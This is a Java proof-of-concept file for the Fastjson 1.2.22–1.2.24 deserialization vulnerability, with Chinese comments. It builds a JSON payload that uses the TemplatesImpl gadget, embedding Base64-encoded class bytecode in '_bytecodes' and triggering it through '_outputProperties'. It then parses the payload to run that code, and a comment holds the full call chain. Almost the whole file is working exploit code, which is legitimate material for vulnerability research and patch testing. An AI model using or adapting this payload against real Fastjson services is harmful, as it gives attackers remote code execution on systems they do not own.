package org.example.no1;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
/**
 * Fastjson 1.2.22-1.2.24 版本的反序列化漏洞
 * <p>
 *     在遇到map类型时，会先调用get拿到这个map，然后添加值进去
 * </p>
 *
 **/
public class PoC1 {
    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }
    public static void main(String args[]){
        try {
            String classFilePath = "CalcTest.class";
            String evilCode = readClass(classFilePath);
            final String NASTY_CLASS =
                    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String text1 = "{\"@type\":\"" + NASTY_CLASS +
                    "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{},\"_outputProperties\":{ }," +
                ",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
            System.out.println(text1);
            Object obj = JSON.parseObject(text1, Feature.SupportNonPublicField);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    /**
     * 调用链
     * at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:458)
     * 	at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:485)
     * 	at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:506)
     * 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
     * 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
     * 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
     * 	at java.lang.reflect.Method.invoke(Method.java:498)
     * 	at com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue(FieldDeserializer.java:85)
     * 	at com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer.parseField(DefaultFieldDeserializer.java:83)
     * 	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseField(JavaBeanDeserializer.java:773)
     * 	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:600)
     * 	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:188)
     * 	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:184)
     * 	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:368)
     * 	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)
     * 	at com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer.deserialze(JavaObjectDeserializer.java:45)
     * 	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:639)
     * 	at com.alibaba.fastjson.JSON.parseObject(JSON.java:339)
     * 	at com.alibaba.fastjson.JSON.parseObject(JSON.java:243)
     * 	at org.example.no1.PoC1.main(PoC1.java:34)
     */
}